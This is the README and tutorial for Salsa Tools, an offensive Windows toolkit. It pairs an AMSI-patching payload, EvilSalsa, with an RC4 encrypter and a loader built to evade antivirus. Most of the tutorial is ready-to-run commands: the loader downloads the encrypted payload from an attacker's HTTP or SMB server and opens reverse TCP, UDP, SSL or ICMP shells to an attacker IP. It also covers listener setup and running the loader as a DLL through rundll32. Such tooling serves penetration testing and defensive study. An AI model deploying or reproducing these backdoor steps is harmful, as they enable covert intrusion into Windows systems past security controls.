![License](https://img.shields.io/badge/license-GNU-green.svg?style=flat-square)

```
   _____       __              ______            __    
  / ___/____ _/ /________ _   /_  __/___  ____  / /____
  \__ \/ __ `/ / ___/ __ `/    / / / __ \/ __ \/ / ___/
 ___/ / /_/ / (__  ) /_/ /    / / / /_/ / /_/ / (__  ) 
/____/\__,_/_/____/\__,_/    /_/  \____/\____/_/____/  

```
# Salsa Tools - An AV-Safe Reverse Shell dipped on bellota sauce  

Salsa Tools is a collection of three different tools that combined, allows you to get a reverse shell on steroids in any Windows environment without even needing PowerShell for it's execution. In order to avoid the latest detection techniques (AMSI), most of the components were initially written on C#. Salsa Tools was publicly released by Luis Vacas during his Talk “Inmersión en la explotación tiene rima” which took place during h-c0n in 9th February 2019.


## Features
    * TCP/UDP/ICMP/DNS/BIND/SSL     
    * AV Safe (17th February)
    * AMSI patchers
    * PowerShell execution 
    * ...
    
## Overview
Salsa-Tools is made from three different  ingredients:
    - EvilSalsa
    - EncrypterAssembly
    - SalseoLoader
And his behavior is as it follows:



## Setup
### Requirements
 - Visual Studio 2017 (or similar)
 - Python 2.7       
### Running la Salsa
#### Cooking EvilSalsa

```
   ___ __ __  ____  _            
  /  _]  |  ||    || |           
 /  [_|  |  | |  | | |           
|    _]  |  | |  | | |___        
|   [_|  :  | |  | |     |       
|     |\   /  |  | |     |       
|_____| \_/  |____||_____|       
                                 
  _____  ____  _     _____  ____ 
 / ___/ /    || |   / ___/ /    |
(   \_ |  o  || |  (   \_ |  o  |
 \__  ||     || |___\__  ||     |
 /  \ ||  _  ||     /  \ ||  _  |
 \    ||  |  ||     \    ||  |  |
  \___||__|__||_____|\___||__|__|
  
[+] That is our Payload
                                 
```

EvilSalsa is the key ingredient of this recipe. It contains the payload, which is executed on the system as it follows: as soon as the payloads starts, it runs `System.Management.Automation.dll` which creates a runspace . Within that runspace we have four types of shells (TCP / UDP / ICMP / DNS / BINDTCP). Once EvilSalsa is loaded, first thing first, the existence of `c:\windows\system32\amsi.dll` is checked. If it exists, it is patched using a home-cooked variant of CyberArk and Rastamouse bypasses.


#### Mixing EncrypterAssembly and Evilsalsa
```
  ______                             _            
 |  ____|                           | |           
 | |__   _ __   ___ _ __ _   _ _ __ | |_ ___ _ __ 
 |  __| | '_ \ / __| '__| | | | '_ \| __/ _ \ '__|
 | |____| | | | (__| |  | |_| | |_) | ||  __/ |   
 |______|_| |_|\___|_|   \__, | .__/ \__\___|_|   
     /\                   __/ | || |   | |        
    /  \   ___ ___  ___ _|___/|_|| |__ | |_   _   
   / /\ \ / __/ __|/ _ \ '_ ` _ \| '_ \| | | | |  
  / ____ \\__ \__ \  __/ | | | | | |_) | | |_| |  
 /_/    \_\___/___/\___|_| |_| |_|_.__/|_|\__, |  
                                           __/ |  
                                          |___/   
			  
 [+] Software that encrypts the payload using RC4
 [+] We have the version in python and the version in .exe
```

EncrypterAssembly can be used as a Python script or as a Exe binary.
It encrypts the previously generated EvilSalsa.

Python usage:
```
python encrypterassembly.py <FILE> <PASSWORD> <OUTPUT>
```
Executable usage:
```
Encrypterassembly.exe <FILE> <PASSWORD> <OUTPUT>
```
#### Bringing the Encrypted EvilSalsa to the table with SalseoLoader
SalseoLoader is in charge of loading the encrypted payload. Can be both compiled as a library or as an executable. If it is run as an executable, the chosen arguments must be provided when the executable is run. If it is compiled as a library, the descriptor "main" must be exported. Arguments are added using environmental variables.

```
  _____  ____  _     _____   ___   ___
 / ___/ /    || |   / ___/  /  _] /   \
(   \_ |  o  || |  (   \_  /  [_ |     |
 \__  ||     || |___\__  ||    _]|  O  |
 /  \ ||  _  ||     /  \ ||   [_ |     |
 \    ||  |  ||     \    ||     ||     |
  \___||__|__||_____|\___||_____| \___/

  _       ___    ____  ___      ___  ____
 | |     /   \  /    ||   \    /  _]|    \
 | |    |     ||  o  ||    \  /  [_ |  D  )
 | |___ |  O  ||     ||  D  ||    _]|    /
 |     ||     ||  _  ||     ||   [_ |    \
 |     ||     ||  |  ||     ||     ||  .  \
 |_____| \___/ |__|__||_____||_____||__|\_|

                             By: CyberVaca@HackPlayers

[+] Usage:

    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseTCP LHOST LPORT
    [-] SalseoLoader.exe password \\smbserver.com\evil\elfuckingmal.txt ReverseUDP LHOST LPORT
    [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseICMP LHOST
    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseDNS LHOST ServerDNS
    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT
    [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseSSL LHOST LPORT

[+] Shells availables:

    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL
    [-] ReverseUDP  [-] ReverseICMP  [-] BindTCP
```

# Tutorial

## Compiling the binaries

Download the source code from the github and compile **EvilSalsa** and **SalseoLoader**. You will need **Visual Studio** installed to compile the code.


Compile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).


You can **select the architecture** inside Visual Studio in the **left "Build" Tab in "Platform Target"**.

(If you can't find this options press in "**Project Tab**" and then in "**<Project-Name> Properties**")

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/imagen1.png)

Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/imagen2.png)

## Prepare the Backdoor

First of all, you will need to encode the **EvilSalsa.dll**. To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**

### Python
```bash
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsa.dll password evilsalsa.dll.txt
```

### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsa.dll password evilsalsa.dll.txt
```

Ok, now you have everything you need to execute all the Salseo thing: the **encoded EvilDalsa.dll** and the **binary of SalseoLoader**.
**Upload the SalseoLoader.exe binary to the machine. It shouldn't be detected by any AV...**

## Execute the backdoor

### Getting a TCP reverse shell (downloading encoded dll through HTTP)

Remember to start a nc as the reverse shell listener, and a HTTP server to serve the encoded evilsalsa.

`SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>`

### Getting a UDP reverse shell (downloading encoded dll through SMB)

Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).

`SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>`

### Getting a TCP reverse shell SSL (using local file)

**Set the listener inside the attacker machine:**

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -key key.pem -cert cert.pem -port <port> -tls1
```
**Execute the backdoor:**
```
SalseoLoader.exe password C:/path/to/evilsalsa.dll.txt ReverseSSL <Attacker-IP> <Port>
```

### Getting a ICMP reverse shell (encoded dll already inside the victim)

**This time you need a special tool in the client to receive the reverse shell. Download:  [https://github.com/inquisb/icmpsh]**

**Disable ICMP Replies:**
```sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

**Execute the client:**

`python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"`

**Inside the victim, lets execute the salseo thing:**

`SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>`


## Compiling SalseoLoader as DLL exporting main function

Open the SalseoLoader project using Visual Studio.

## Add before the main function: \[DllExport\]

Before the main function add this line: \[DllExport\]

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/imagen3.png)

### Install DllExport for this project

**Tools --> NuGet Package Manager --> Manage NuGet Packages for Solution...**

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/imagen4.png)

**Search for DllExport package (using Browse tab), and press Install (and accept the popup)**

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/imagen5.png)

In your project folder have appeared the files: **DllExport.bat** and **DllExport_Configure.bat**

### Uninstall DllExport

Press **Uninstall** (yeah, its weird but trust me, it is necessary)

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/imagen6.png)

### Exit Visual Studio and execute DllExport_configure

Just **exit** Visual Studio

Then, go to your **SalseoLoader folder** and **execute DllExport_Configure.bat**
Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/imagen7.png)

### Open the project again with visual Studio
**\[DllExport\]** should not be longer marked as error

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/imagen8.png)

### Build the solution
Select **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/imagen9.png)

Select **x64 platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/imagen10.png)

To **build** the solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)

### Test the generated Dll

Copy and paste the Dll where you want to test it.

Execute:

`rundll32.exe SalseoLoader.dll,main`

If not error appears, probably you have a functional dll!!

## Get a shell using the Dll

Don't forget to use a **HTTP server and set a nc listener**

### Powershell

```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```

### CMD

```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```

Documented by https://github.com/carlospolop-forks/
